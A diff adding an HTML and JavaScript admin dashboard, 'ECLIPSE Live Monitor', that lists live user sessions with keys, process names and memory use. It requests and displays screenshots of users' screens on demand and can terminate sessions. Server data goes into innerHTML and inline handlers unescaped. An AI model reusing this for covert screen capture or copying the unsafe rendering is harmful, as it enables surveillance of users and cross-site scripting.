@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ECLIPSE | Live Monitor</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="monitor-container">
+        <!-- Header -->
+        <header class="monitor-header">
+            <div class="logo">
+                <i class="fas fa-video"></i>
+                <h1>ECLIPSE LIVE MONITOR</h1>
+            </div>
+            <div class="monitor-stats">
+                <span id="activeUsers">0</span> Active Users
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <div class="monitor-content">
+            <!-- Statistics Cards -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-users"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3>Total Sessions</h3>
+                        <span id="totalSessions">0</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-memory"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3>Avg Memory</h3>
+                        <span id="avgMemory">0 MB</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-clock"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3>Uptime</h3>
+                        <span id="uptime">00:00:00</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Live Sessions -->
+            <div class="card">
+                <h2><i class="fas fa-play-circle"></i> Live Sessions</h2>
+                <div class="sessions-list" id="sessionsList">
+                    <!-- Sessions will be populated here -->
+                    <div class="no-sessions">
+                        <i class="fas fa-eye-slash"></i>
+                        <p>No active sessions</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Screenshots Feed -->
+            <div class="card">
+                <h2><i class="fas fa-camera"></i> Screenshots Feed</h2>
+                <div class="screenshots-grid" id="screenshotsGrid">
+                    <!-- Screenshots will appear here -->
+                    <div class="no-screenshots">
+                        <i class="fas fa-image"></i>
+                        <p>No screenshots yet</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let ws = null;
+        let activeSessions = new Map();
+        let startTime = Date.now();
+
+        // Connect to WebSocket
+        function connectWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}`;
+            
+            ws = new WebSocket(wsUrl);
+            
+            ws.onopen = () => {
+                console.log('Connected to monitor server');
+                // Register as admin client
+                ws.send(JSON.stringify({
+                    type: 'register',
+                    clientType: 'admin',
+                    userId: 'admin-' + Math.random().toString(36).substr(2, 9)
+                }));
+            };
+            
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    handleWebSocketMessage(data);
+                } catch (error) {
+                    console.error('WebSocket message error:', error);
+                }
+            };
+            
+            ws.onclose = () => {
+                console.log('WebSocket connection closed');
+                // Try to reconnect after 5 seconds
+                setTimeout(connectWebSocket, 5000);
+            };
+            
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+        }
+        
+        // Handle WebSocket messages
+        function handleWebSocketMessage(data) {
+            switch (data.type) {
+                case 'live_update':
+                    updateLiveSession(data.data);
+                    break;
+                    
+                case 'screenshot':
+                    addScreenshot(data.data);
+                    break;
+            }
+        }
+        
+        // Update live session
+        function updateLiveSession(sessionData) {
+            activeSessions.set(sessionData.userId, {
+                ...sessionData,
+                lastUpdate: Date.now()
+            });
+            
+            updateSessionsList();
+            updateStats();
+        }
+        
+        // Update sessions list
+        function updateSessionsList() {
+            const sessionsList = document.getElementById('sessionsList');
+            sessionsList.innerHTML = '';
+            
+            if (activeSessions.size === 0) {
+                sessionsList.innerHTML = `
+                    <div class="no-sessions">
+                        <i class="fas fa-eye-slash"></i>
+                        <p>No active sessions</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            activeSessions.forEach((session, userId) => {
+                const sessionElement = document.createElement('div');
+                sessionElement.className = 'session-item';
+                sessionElement.innerHTML = `
+                    <div class="session-info">
+                        <div class="session-header">
+                            <span class="session-user">User: ${userId.substring(0, 8)}</span>
+                            <span class="session-status live">LIVE</span>
+                        </div>
+                        <div class="session-details">
+                            <div class="session-key">
+                                <code>${session.key}</code>
+                            </div>
+                            <div class="session-meta">
+                                <span class="session-process">
+                                    <i class="fas fa-microchip"></i>
+                                    ${session.process} | ${session.memory} MB
+                                </span>
+                                <span class="session-time">
+                                    <i class="fas fa-clock"></i>
+                                    ${new Date(session.timestamp).toLocaleTimeString()}
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="session-actions">
+                        <button class="btn-secondary btn-small" onclick="requestScreenshot('${userId}')">
+                            <i class="fas fa-camera"></i>
+                            Screenshot
+                        </button>
+                        <button class="btn-secondary btn-small btn-danger" onclick="terminateSession('${userId}')">
+                            <i class="fas fa-skull"></i>
+                            Terminate
+                        </button>
+                    </div>
+                `;
+                sessionsList.appendChild(sessionElement);
+            });
+        }
+        
+        // Add screenshot to feed
+        function addScreenshot(screenshotData) {
+            const screenshotsGrid = document.getElementById('screenshotsGrid');
+            const screenshotElement = document.createElement('div');
+            screenshotElement.className = 'screenshot-item';
+            screenshotElement.innerHTML = `
+                <div class="screenshot-header">
+                    <span class="screenshot-user">User: ${screenshotData.userId.substring(0, 8)}</span>
+                    <span class="screenshot-time">${new Date(screenshotData.timestamp).toLocaleTimeString()}</span>
+                </div>
+                <img src="data:image/png;base64,${screenshotData.image}" alt="Screenshot" class="screenshot-image">
+                <div class="screenshot-footer">
+                    <code class="screenshot-key">${screenshotData.key}</code>
+                </div>
+            `;
+            
+            // Add to beginning of the grid
+            screenshotsGrid.insertBefore(screenshotElement, screenshotsGrid.firstChild);
+            
+            // Remove old screenshots if too many
+            if (screenshotsGrid.children.length > 20) {
+                screenshotsGrid.removeChild(screenshotsGrid.lastChild);
+            }
+        }
+        
+        // Update statistics
+        function updateStats() {
+            document.getElementById('activeUsers').textContent = activeSessions.size;
+            document.getElementById('totalSessions').textContent = activeSessions.size;
+            
+            // Calculate average memory
+            let totalMemory = 0;
+            activeSessions.forEach(session => {
+                totalMemory += session.memory || 0;
+            });
+            const avgMemory = activeSessions.size > 0 ? Math.round(totalMemory / activeSessions.size) : 0;
+            document.getElementById('avgMemory').textContent = `${avgMemory} MB`;
+        }
+        
+        // Update uptime
+        function updateUptime() {
+            const now = Date.now();
+            const uptimeMs = now - startTime;
+            const hours = Math.floor(uptimeMs / 3600000);
+            const minutes = Math.floor((uptimeMs % 3600000) / 60000);
+            const seconds = Math.floor((uptimeMs % 60000) / 1000);
+            
+            document.getElementById('uptime').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Request screenshot from client
+        function requestScreenshot(userId) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'request_screenshot',
+                    userId: userId
+                }));
+            }
+        }
+        
+        // Terminate session
+        function terminateSession(userId) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'terminate_session',
+                    userId: userId
+                }));
+                activeSessions.delete(userId);
+                updateSessionsList();
+                updateStats();
+            }
+        }
+        
+        // Clean up old sessions
+        function cleanupSessions() {
+            const now = Date.now();
+            activeSessions.forEach((session, userId) => {
+                if (now - session.lastUpdate > 30000) { // 30 seconds timeout
+                    activeSessions.delete(userId);
+                }
+            });
+            updateSessionsList();
+            updateStats();
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            connectWebSocket();
+            updateUptime();
+            setInterval(updateUptime, 1000);
+            setInterval(cleanupSessions, 5000);
+        });
+    </script>
+</body>
+</html>
